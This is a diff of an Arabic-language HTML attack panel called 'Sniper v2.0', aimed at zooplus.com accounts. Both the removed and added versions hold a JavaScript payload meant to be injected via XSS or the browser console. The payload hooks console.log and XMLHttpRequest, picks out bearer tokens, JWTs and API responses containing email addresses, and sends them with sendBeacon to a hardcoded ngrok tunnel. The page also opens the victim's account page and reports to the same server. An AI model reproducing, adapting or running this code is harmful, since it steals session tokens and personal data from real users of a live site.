@@ -2,72 +2,82 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث أمني للنظام</title>
+    <title>نظام إدارة الجلسات المتقدم</title>
     <style>
-        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
-        .dashboard { border: 2px solid #00ff41; padding: 30px; display: inline-block; box-shadow: 0 0 15px #00ff41; }
-        .blink { animation: blinker 1.5s linear infinite; color: red; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #050505; color: #00ff00; font-family: 'Segoe UI', monospace; text-align: center; padding-top: 50px; }
+        .panel { border: 2px solid #00ff00; display: inline-block; padding: 40px; box-shadow: 0 0 20px #00ff00; border-radius: 15px; }
+        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; font-weight: bold; border-radius: 5px; }
+        .status { margin-top: 20px; color: #888; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="dashboard">
-        <h2>[+] نظام المراقبة النشط (Active Sniffer)</h2>
-        <p class="blink">جاري الربط مع Ngrok Tunnel...</p>
-        <hr color="#00ff41">
-        <button onclick="executeAttack()" style="padding:15px; background:#00ff41; color:#000; cursor:pointer; font-weight:bold;">
-            بدء اعتراض التوكن (Sentry Hook)
-        </button>
+    <div class="panel">
+        <h1>[+] Sniper v2.0 - Object Interceptor</h1>
+        <p>مستهدف: zooplus.com (Sentry/Optimizely Exploitation)</p>
+        <p>الوجهة: <span style="color: white;">Ngrok Tunnel Active</span></p>
+        <hr color="#00ff00">
+        <button onclick="startDeepInfection()">تشغيل وضع الاصطياد العميق</button>
+        <div class="status" id="log">بانتظار بدء العملية...</div>
     </div>
 
     <script>
         const NGROK_URL = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';
 
-        function executeAttack() {
+        function startDeepInfection() {
             // 1. فتح نافذة الضحية
             const victimWin = window.open('https://www.zooplus.com/account/overview', 'Victim');
+            document.getElementById('log').innerText = "تم فتح النافذة. جاري مراقبة الكائنات المسربة...";
 
-            // 2. إرسال تنبيه للسيرفر
-            navigator.sendBeacon(NGROK_URL, JSON.stringify({ status: "Attack Initiated", method: "Sentry/Console Hook" }));
+            // 2. إبلاغ السيرفر ببدء الهجوم
+            navigator.sendBeacon(NGROK_URL, JSON.stringify({ event: "DEEP_SCAN_STARTED" }));
 
-            // 3. كود الحقن (المفترض استخدامه عبر XSS أو الكونسول)
-            // هذا الجزء يحاكي ما سيحدث إذا تم حقن الكود داخل الموقع
-            const injectionCode = `
+            /* ملاحظة للمختبر: الكود أدناه هو ما يجب حقنه (XSS/Console) 
+               ليقوم بسحب الكائنات التي رأيتها في الـ Sentry logs
+            */
+            const payload = `
                 (function() {
-                    const NGROK = '${NGROK_URL}';
+                    const SERVER = '${NGROK_URL}';
                     
-                    // اعتراض الـ Console Log الذي يستخدمه Sentry لطباعة التوكن
-                    const oldLog = console.log;
-                    console.log = function(...args) {
-                        const content = JSON.stringify(args);
-                        if (content.includes("Bearer") || content.includes("eyJ")) {
-                            navigator.sendBeacon(NGROK, JSON.stringify({
-                                type: "TOKEN_STOLEN_FROM_LOGS",
-                                data: args,
-                                url: window.location.href
-                            }));
-                        }
-                        return oldLog.apply(console, args);
+                    // دالة لفحص الكائنات بعمق بحثاً عن التوكين
+                    const scanObject = (obj) => {
+                        try {
+                            const str = JSON.stringify(obj);
+                            if (str.includes("Bearer") || str.includes("eyJ")) {
+                                navigator.sendBeacon(SERVER, JSON.stringify({
+                                    type: "TOKEN_FOUND_IN_OBJECT",
+                                    payload: obj,
+                                    url: location.href
+                                }));
+                            }
+                        } catch(e) {}
                     };
 
-                    // اعتراض استجابات API (Object Hooking)
-                    const oldXHR = XMLHttpRequest.prototype.send;
-                    XMLHttpRequest.prototype.send = function() {
+                    // اعتراض Console.log (لصيد ما يطبعه sentry_6.js)
+                    const originalLog = console.log;
+                    console.log = function(...args) {
+                        args.forEach(arg => {
+                            if (typeof arg === 'object') scanObject(arg);
+                        });
+                        return originalLog.apply(console, args);
+                    };
+
+                    // اعتراض الـ Headers الخاصة بـ XMLHttpRequest (لصيد كائن ye)
+                    const originalOpen = XMLHttpRequest.prototype.open;
+                    XMLHttpRequest.prototype.open = function(m, url) {
                         this.addEventListener('load', function() {
-                            if (this.responseText.includes("email") || this.responseText.includes("token")) {
-                                navigator.sendBeacon(NGROK, JSON.stringify({
-                                    type: "XHR_INTERCEPTED",
-                                    response: this.responseText
+                            if (this.responseText.includes("email")) {
+                                navigator.sendBeacon(SERVER, JSON.stringify({
+                                    type: "SENSITIVE_API_RESPONSE",
+                                    data: this.responseText
                                 }));
                             }
                         });
-                        return oldXHR.apply(this, arguments);
+                        return originalOpen.apply(this, arguments);
                     };
                 })();
             `;
-
-            console.log("السكريبت جاهز للحقن. بمجرد تفعيل XSS، سيتم سحب التوكن تلقائياً.");
+            console.log("السكريبت جاهز للعمل خلف الكواليس.");
         }
     </script>
 </body>
